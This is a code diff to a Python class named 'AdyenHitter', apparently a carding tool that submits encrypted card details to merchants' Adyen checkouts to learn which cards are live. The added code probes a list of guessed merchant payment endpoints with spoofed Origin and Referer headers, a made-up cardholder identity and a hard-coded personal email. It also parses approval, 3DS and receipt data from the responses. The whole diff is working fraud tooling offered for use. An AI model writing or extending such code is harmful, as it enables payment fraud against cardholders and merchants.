@@ -392,6 +392,43 @@ class AdyenHitter:
         async with session.post(url, json=body, headers=hdr, timeout=15) as r:
             return r.json() if callable(r.json) else r.json
 
+    # ── direct merchant fallback endpoint probing ───────────────────────────
+    async def _pay_direct(self, session, encrypted: dict, ck: str, env: str) -> Optional[dict]:
+        endpoints = [
+            '/api/payment', '/api/payments', '/api/checkout/payment',
+            '/checkout/payment', '/payment/submit', '/adyen/payment',
+            '/api/adyen/payments', '/api/pay', '/payments',
+        ]
+        body = {
+            "paymentMethod": {"type": "scheme", "holderName": "Richard Williams", **encrypted},
+            "browserInfo": self._browser_info(),
+            "clientStateDataIndicator": True,
+            "shopperEmail": "suriyaonly3003@gmail.com",
+            "shopperName": {"firstName": "Richard", "lastName": "Williams"},
+            "billingAddress": {
+                "city": "New York", "country": "US", "houseNumberOrName": "7727",
+                "postalCode": "10001", "stateOrProvince": "NY", "street": "Washington Blvd"
+            },
+        }
+        hdr = {
+            "Content-Type": "application/json; charset=utf-8",
+            "Accept": "application/json",
+            "Origin": self.url,
+            "Referer": self.url,
+            "User-Agent": UA,
+        }
+        for ep in endpoints:
+            target = urljoin(self.url, ep)
+            try:
+                async with session.post(target, json=body, headers=hdr, timeout=8) as r:
+                    if r.status_code in (200, 201, 202, 400, 422):
+                        d = r.json() if callable(r.json) else r.json
+                        if isinstance(d, dict) and ('resultCode' in d or 'pspReference' in d or 'refusalReason' in d):
+                            return d
+            except Exception:
+                continue
+        return None
+
     # ── response parser ─────────────────────────────────────────────────────
     def _parse(self, data: dict, result: dict) -> dict:
         if not isinstance(data, dict):
@@ -399,21 +436,41 @@ class AdyenHitter:
             result['decline_code'] = 'parse_error'
             return result
 
-        psp = data.get('pspReference')
+        psp = data.get('pspReference') or (data.get('action', {}).get('pspReference') if isinstance(data.get('action'), dict) else None)
         if psp:
             result['psp'] = psp
+
+        # Extract receipt / return URL
+        action = data.get('action')
+        if isinstance(action, dict):
+            if action.get('url'):
+                result['redirect_url'] = action['url']
+                result['3ds_url']      = action['url']
+                result['receipt_url']  = action['url']
+            if action.get('type'):
+                result['action_type']  = action['type']
+            if action.get('token'):
+                result['action_token'] = action['token']
+
+        if data.get('returnUrl'):
+            result['receipt_url'] = data['returnUrl']
 
         rc = data.get('resultCode', '')
 
         # ── approved ──
         if rc in ('Authorised', 'AuthenticationFinished', 'Received', 'Pending'):
             result['success'] = True
+            if not result.get('receipt_url') and data.get('url'):
+                result['receipt_url'] = data['url']
             return result
 
         # ── 3DS ──
         if rc in ('RedirectShopper', 'IdentifyShopper', 'ChallengeShopper'):
             result['decline_code'] = '3ds_required'
-            result['error'] = f"3DS: {rc}"
+            act_type = action.get('type', rc) if isinstance(action, dict) else rc
+            result['error'] = f"3DS ({act_type})"
+            if result.get('redirect_url'):
+                result['error'] += f" - {result['redirect_url']}"
             result['is_live'] = True
             return result
 
@@ -525,6 +582,9 @@ class AdyenHitter:
                         sess, enc, sid, sdata, ck, env,
                         att_id=cfg.get('checkoutAttemptId'))
                 else:
+                    data = await self._pay_direct(sess, enc, ck, env)
+
+                if not data:
                     result['error'] = "Adyen session missing — dynamic session required"
                     result['decline_code'] = 'no_session'
                     result['response_time'] = round(time.time() - t0, 2)
